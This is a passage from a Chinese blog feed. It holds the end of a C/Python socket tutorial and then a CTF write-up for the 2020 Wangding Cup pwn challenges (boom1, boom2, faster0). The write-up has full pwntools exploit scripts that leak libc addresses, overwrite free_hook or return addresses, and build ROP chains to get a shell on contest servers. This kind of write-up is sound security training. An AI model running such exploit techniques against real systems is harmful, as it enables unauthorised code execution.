class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"send msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (rec_len = recv(socket_fd, buf, BUFSIZE, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"recv msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">buf[rec_len] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Recvived : %s\n"</span>, buf);</span><br><span class="line"><span class="built_in">close</span>(socket_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h4 id="服务器端-1"><a href="#服务器端-1" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.bind((host, port))</span><br><span class="line"></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">c,addr = s.accept()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'address'</span>,addr</span><br><span class="line">msg = <span class="string">"welcome to my service. \nif you want to exit, please input exit."</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">c.send(msg)</span><br><span class="line">buf = c.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">c.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">msg = <span class="string">"you have input: "</span>+buf</span><br></pre></td></tr></table></figure><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.connect((host, port))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">buf = sys.stdin.readline()</span><br><span class="line">s.send(buf)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Linux的SOCKET编程详解 - 江召伟 - 博客园  <a href="https://www.cnblogs.com/jiangzhaowei/p/8261174.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangzhaowei/p/8261174.html</a></p><p>Python 网络编程 | 菜鸟教程  <a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-socket.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h2&gt;&lt;p&gt;网络进程标识：ip地址，协议，端口。&lt;/p&gt;
&lt;p&gt;TCP/IP是传输控制协议/网间协议。&lt;/p&gt;
&lt;p&gt;TCP/IP协议存
      
    
    </summary>
    
    
      <category term="编程" scheme="https://nuoye-blog.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="socket" scheme="https://nuoye-blog.github.io/tags/socket/"/>
    
      <category term="c" scheme="https://nuoye-blog.github.io/tags/c/"/>
    
      <category term="编程" scheme="https://nuoye-blog.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎青龙组pwn-wp</title>
    <link href="https://nuoye-blog.github.io/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/"/>
    <id>https://nuoye-blog.github.io/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/</id>
    <published>2020-05-19T03:55:00.000Z</published>
    <updated>2020-05-19T03:54:24.402Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>一个语义分析的程序，好像是c4编译器（不清楚不了解，毕竟没有上过半节计算机的课），栈、text、symbol都存放在malloc出来的几块大内存上，可以定义全局变量和局部变量，局部变量存在栈上。通过局部变量leak出栈地址，再接着leak libc基地址，最后修改free_hook为onegadget一把梭。在（PS：这里已经有libc地址并且能任意写了，所以还有一大堆的利用方式，都可以用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">p &#x3D; remote(&quot;182.92.73.10&quot;,24573)</span><br><span class="line">#gdb.attach(p,&#39;b free&#39;)</span><br><span class="line">p.sendline(&#39;&#39;&#39;</span><br><span class="line">libc;</span><br><span class="line">*ptr;</span><br><span class="line">*stack;</span><br><span class="line">chunk;</span><br><span class="line">main()&#123;</span><br><span class="line">void *add;</span><br><span class="line">add &#x3D; &amp;add;</span><br><span class="line">stack &#x3D; add + 0x18;</span><br><span class="line">stack &#x3D; *stack;</span><br><span class="line">stack &#x3D; stack -29;</span><br><span class="line">libc &#x3D; *stack -0x20830;</span><br><span class="line">ptr &#x3D; libc+0x3c67a8;</span><br><span class="line">*ptr &#x3D; libc+0x4526a;</span><br><span class="line">free(chunk);</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><p>vmpwn题，实现了几个汇编指令，不过一大堆没用的。思路：首先获得指向libc_start_main+240的指针，并且push进栈以保存，然后通过add等指令计算出onegadget地址，再通过前面保存的指针覆写返回地址，最后getshell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">'182.92.73.10'</span>, <span class="number">36642</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_base</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">13</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">26</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imm</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">n += <span class="number">1</span> &lt;&lt; <span class="number">64</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">9</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wm</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> payload</span><br><span class="line">payload += p64(<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取宿主机的栈地址</span></span><br><span class="line">stack_base((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">4</span>)</span><br><span class="line">rm()</span><br><span class="line">push()</span><br><span class="line">imm(<span class="number">0xe8</span>)</span><br><span class="line">sub()<span class="comment">#reg = main_stack = stack_point - 0xe8</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#获取宿主机的libc_start_main+240地址</span></span><br><span class="line"></span><br><span class="line">rm() <span class="comment">#reg = *main_stack = libc_start_main+0x240</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#计算偏移</span></span><br><span class="line">imm(<span class="number">0xD0917</span>) <span class="comment">#reg = offset</span></span><br><span class="line">add() <span class="comment">#add reg,stack</span></span><br><span class="line"><span class="comment">#替换libc_start_main+240也就是返回地址为onegadget</span></span><br><span class="line">wm()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your code&gt;"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="faster0"><a href="#faster0" class="headerlink" title="faster0"></a>faster0</h2><p>这道题比赛的时候没有做出来。。。那个path太恶心了。然后找了pizza大佬要了脚本来看看，发现用了Capstone（嗯，不会用，所以也顺便去学了下）。大概思路就是：先获取函数地址与对应函数索引的值（比如func000就是{0:0x4008A4}）形成map；然后通过Capstone获取其中的一个跳转的table，对其中的数值解析获取到跳转函数地址（call func001这些指令）；然后再利用call指令中的相对偏移加上call下一指令的地址获取到跳转到目标函数的地址形成路线图；再通过路线图与前面形成的map就可以得出path。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">1</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span><span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br></pre></td></tr></table></figure><p>然后接下来就是一个简单的栈溢出，没啥好讲的，直接上完整的exp吧：</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>首先是前面过pow的加上获得elf的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">token = ****</span><br><span class="line">p = remote(<span class="string">"39.96.72.181"</span>,<span class="string">"42732"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">dest = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(printable, repeat=<span class="number">4</span>):</span><br><span class="line">s = <span class="string">''</span>.join(i)</span><br><span class="line">x = hashlib.sha256(s).hexdigest()</span><br><span class="line">x2 = x[:<span class="number">20</span>]</span><br><span class="line"><span class="keyword">if</span> dest == x2:</span><br><span class="line">print(<span class="string">'string : '</span> + s)</span><br><span class="line">p.sendline(s)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your token:"</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">p.recvuntil(<span class="string">"Creating pwn file, please wait ...\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">s = p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = base64.b64decode(s)</span><br><span class="line">f = open(<span class="string">"pwn"</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(a)</span><br><span class="line">f.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后是elf的一个getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"pwn"</span>).libc</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">100</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span><span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote(IP, PORT)</span></span><br><span class="line">p.sendline(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_ptr = <span class="number">0x400640</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000406013</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000406011</span></span><br><span class="line">write_got = <span class="number">0x609018</span></span><br><span class="line">bss = <span class="number">0x609500</span></span><br><span class="line">read_ptr = <span class="number">0x400680</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xd0</span></span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_ptr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_ptr)</span><br><span class="line">payload += p64(<span class="number">0x405f4a</span>)</span><br><span class="line">payload += p64(<span class="number">0x405F30</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"WOW,U R GREAT !\n"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;h2 id=&quot;boom1&quot;&gt;&lt;a href=&quot;#boom1&quot; class=&quot;headerlink&quot; title=&quot;boom1&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>capstone学习笔记</title>
    <link href="https://nuoye-blog.github.io/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nuoye-blog.github.io/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-05-18T17:41:00.000Z</published>
    <updated>2020-05-18T17:46:41.287Z</updated>
    
